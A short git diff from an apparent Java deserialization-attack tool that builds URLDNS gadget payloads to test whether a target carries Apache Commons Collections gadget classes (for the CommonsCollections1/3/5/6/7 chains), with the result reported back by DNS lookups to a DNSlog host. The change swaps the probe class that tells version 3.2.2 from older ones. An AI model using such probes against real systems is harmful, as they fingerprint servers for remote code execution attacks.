@@ -99,7 +99,7 @@ public class en {
 		case "CommonsCollections13567":
 	    	//CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
 	    	HashMap cc31or321 = getURLDNSgadget("http://cc31or321."+dnslog, "org.apache.commons.collections.functors.ChainedTransformer");
-	    	HashMap cc322 = getURLDNSgadget("http://cc322."+dnslog, "org.apache.commons.collections.ExtendedProperties$1");
+	    	HashMap cc322 = getURLDNSgadget("http://cc322."+dnslog, "org.apache.commons.collections.functors.FunctorUtils$1");
 	  		list.add(cc31or321);
 	  		list.add(cc322);
 			break;
@@ -306,4 +306,5 @@ public class en {
     }
 
 }
+
 
